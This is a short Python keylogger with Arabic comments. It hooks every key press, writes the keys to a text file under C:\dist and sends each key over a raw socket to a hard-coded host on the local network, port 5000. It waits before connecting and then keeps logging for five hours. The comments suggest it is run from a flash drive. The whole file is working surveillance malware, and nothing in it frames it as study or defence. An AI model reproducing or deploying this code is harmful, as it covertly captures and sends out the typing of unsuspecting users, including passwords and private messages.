import os
import keyboard
import socket
import time
import langid

# تحديد مسار الفلاشة
flash_drive_path = "C:\\"

# تحديد مسار المجلد في الفلاشة
dist_folder_path = os.path.join(flash_drive_path, "dist")

# إذا لم يكن المسار المحدد موجودًا، يتم تجاهله ومواصلة البرنامج
if os.path.exists(flash_drive_path):
    # التأكد من وجود المجلد، وإن لم يكن موجودًا يتم إنشاؤه
    if not os.path.exists(dist_folder_path):
        os.makedirs(dist_folder_path, exist_ok=True)
    # معلومات الاتصال بالجهاز الآخر
    server_ip = '192.168.1.152'  # عنوان IP للجهاز الآخر
    server_port = 5000  # رقم المنفذ للاتصال

    def log_keystrokes():
        keyboard.on_press(log_key)

    def log_key(event):
        key = event.name
        if len(key) > 1 or key == "space":
            key = f"<{key}>"

        # التأكد من لغة النص المكتوب
        detected_language = detect_language(key)

        if detected_language == 'en':
            with open(os.path.join(dist_folder_path, "keystrokes.txt"), "a", encoding="utf-8") as f:
                f.write(str(key) + '\n')

            # إرسال المفتاح عبر الشبكة
            client_socket.send(key.encode("utf-8"))

    def detect_language(text):
        # قم بتنفيذ تحليل اللغة باستخدام langid
        detected_lang, _ = langid.classify(text)
        return detected_lang

    # تأخير قبل الاتصال بالخادم لمدة 20 ثانية
    time.sleep(20)

    # إنشاء اتصال بالخادم
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # تعيين log_keystrokes() بعد إنشاء اتصال الخادم
    log_keystrokes()

    # إضافة إشارة للحفاظ على ظهور النافذة لبعض الوقت (5 ساعات)
    time.sleep(5 * 60 * 60)

    # إغلاق اتصال الخادم
    client_socket.close()
